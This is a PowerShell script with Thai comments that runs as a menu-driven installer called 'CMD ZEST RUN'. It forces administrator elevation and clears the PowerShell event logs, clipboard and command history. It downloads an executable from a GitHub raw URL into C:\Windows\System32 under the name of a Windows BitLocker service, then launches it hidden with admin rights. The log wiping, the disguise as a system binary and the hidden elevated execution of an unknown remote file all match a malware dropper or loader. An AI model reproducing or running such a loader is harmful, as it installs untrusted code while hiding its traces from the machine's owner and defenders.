# --- FORCE RUN AS ADMINISTRATOR ---
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# --- CLEAR LOGS, HISTORY & CLIPBOARD FUNCTION ---
function Clear-LogsAndHistory {
    # ลบข้อมูลใน Clipboard ทันที
    try { Set-Clipboard -Value $null -ErrorAction SilentlyContinue } catch {}
    
    $history = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    try {
        Clear-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue
        [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("Microsoft-Windows-PowerShell/Operational")
    } catch {}

    if (Test-Path $history) {
        Write-Host " [*] Opening history log. Please save and close it to proceed..." -ForegroundColor Yellow
        (Start-Process notepad.exe -ArgumentList $history -PassThru).WaitForExit()
    }
}

# เปิดโปรแกรมมาให้เคลียร์ Clipboard ทันที
try { Set-Clipboard -Value $null -ErrorAction SilentlyContinue } catch {}

# --- SAFE CONSOLE RESIZER ---
try {
    $raw = $Host.UI.RawUI
    $newWidth = 54
    $newHeight = 17 # ขยายความสูงขึ้นเล็กน้อยเพื่อรองรับเมนู Update ที่เพิ่มเข้ามา

    $raw.BufferSize = New-Object System.Management.Automation.Host.Size($newWidth, 99)
    $raw.WindowSize = New-Object System.Management.Automation.Host.Size($newWidth, $newHeight)
    $raw.BufferSize = New-Object System.Management.Automation.Host.Size($newWidth, $newHeight)
} catch {
    try {
        [Console]::WindowWidth = 54
        [Console]::WindowHeight = 17
    } catch {}
}

# --- CONFIGURATION ---
$url = "https://raw.githubusercontent.com/18321-creator/Pro/refs/heads/main/Pro.exe"
$path = "C:\Windows\System32\BdeUISvc.exe"
$history = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"


# --- UI FUNCTIONS ---
function Show-Spin ($msg) {
    $sp = @('/', '-', '\', '|')
    for ($i=0; $i -lt 8; $i++) {
        Clear-Host; Show-Head
        Write-Host "  [$($sp[$i%4])] $msg..." -ForegroundColor Magenta
        Start-Sleep -Milliseconds 100
    }
}

function Show-Head {
    $st = if (Test-Path $path) { "[ READY ]" } else { "[ NOT INSTALLED ]" }
    $cl = if (Test-Path $path) { "Green" } else { "DarkGray" }

    Write-Host "CMD ZEST RUN" -ForegroundColor Cyan
    Write-Host "+---------------------------------------------------+" -ForegroundColor DarkCyan
    Write-Host " STATUS: " -NoNewline -ForegroundColor White; Write-Host $st -ForegroundColor $cl
    Write-Host "+---------------------------------------------------+" -ForegroundColor DarkCyan
}

function Show-Menu {
    Clear-Host; Show-Head
    $isIns = Test-Path $path

    Write-Host "  [1] INSTALL   » Setup Core" -ForegroundColor White
    Write-Host "  [2] UNINSTALL » Clean System" -ForegroundColor White
    Write-Host "  [3] UPDATE    » Refresh Latest Core" -ForegroundColor Cyan # เพิ่มเมนู Update

    if ($isIns) {
        Write-Host "  [4] LAUNCH    » Run as Admin & Exit" -ForegroundColor Green
        Write-Host "  [5] EXIT      » Close Tool" -ForegroundColor Red
    } else {
        Write-Host "  [4] EXIT      » Close Tool" -ForegroundColor Red
    }

    Write-Host "+---------------------------------------------------+" -ForegroundColor DarkCyan
    Write-Host "  CHOICE: " -NoNewline -ForegroundColor White

    $ch = Read-Host
    # ปรับ Logic การเลือกกรณีไม่ได้ติดตั้งไฟล์
    if (-not $isIns -and $ch -eq "4") { $ch = "5" }

    if ($ch -in @("1", "2", "3", "4", "5")) {
        Clear-LogsAndHistory
    }

    switch ($ch) {
        "1" { 
            Show-Spin "Installing"
            try { 
                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                Invoke-WebRequest $url -OutFile $path -ErrorAction Stop
                Clear-Host; Show-Head; Write-Host "`n  [+] SUCCESS!" -ForegroundColor Green 
            } catch { 
                Write-Host "`n  [-] FAILED" -ForegroundColor Red 
            }
            [Console]::ReadKey($true) | Out-Null; Show-Menu 
        }
        "2" { 
            Show-Spin "Cleaning"
            Stop-Process -Name "svcmgr_un" -Force -ErrorAction SilentlyContinue
            if (Test-Path $path) { 
                try { 
                    takeown /f $path /a | Out-Null
                    icacls $path /grant *S-1-5-32-544:F /c | Out-Null
                    Remove-Item $path -Force -ErrorAction Stop
                    Write-Host "`n  [+] SYSTEM CLEANED" -ForegroundColor Green 
                } catch { 
                    Write-Host "`n  [-] ACCESS DENIED" -ForegroundColor Red 
                } 
            } else { 
                Write-Host "`n  [!] ALREADY CLEAN" -ForegroundColor Cyan 
            }
            [Console]::ReadKey($true) | Out-Null; Show-Menu 
        }
        "3" { 
            # --- ฟังก์ชัน UPDATE ที่เพิ่มเข้ามา ---
            Show-Spin "Updating Core"
            Stop-Process -Name "svcmgr_un" -Force -ErrorAction SilentlyContinue
            if (Test-Path $path) {
                try {
                    takeown /f $path /a | Out-Null
                    icacls $path /grant *S-1-5-32-544:F /c | Out-Null
                    Remove-Item $path -Force -ErrorAction Stop
                } catch {}
            }
            try {
                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                Invoke-WebRequest $url -OutFile $path -ErrorAction Stop
                Clear-Host; Show-Head; Write-Host "`n  [+] UPDATE SUCCESSFUL!" -ForegroundColor Green
            } catch {
                Write-Host "`n  [-] UPDATE FAILED" -ForegroundColor Red
            }
            [Console]::ReadKey($true) | Out-Null; Show-Menu
        }
        "4" { 
            Show-Spin "Launching"
            try { 
                Start-Process $path -WindowStyle Hidden -Verb RunAs
                Clear-Host; Show-Head; Write-Host "`n  [+] RUNNING WITH ADMIN PRIVILEGES" -ForegroundColor Green
                Start-Sleep -Seconds 2; exit 
            } catch { 
                Write-Host "`n  [-] ERROR RUNNING FILE" -ForegroundColor Red
                [Console]::ReadKey($true) | Out-Null; Show-Menu 
            } 
        }
        "5" { exit }
        default { Show-Menu }
    }
}

# --- START RUN SYSTEM ---
Show-Menu
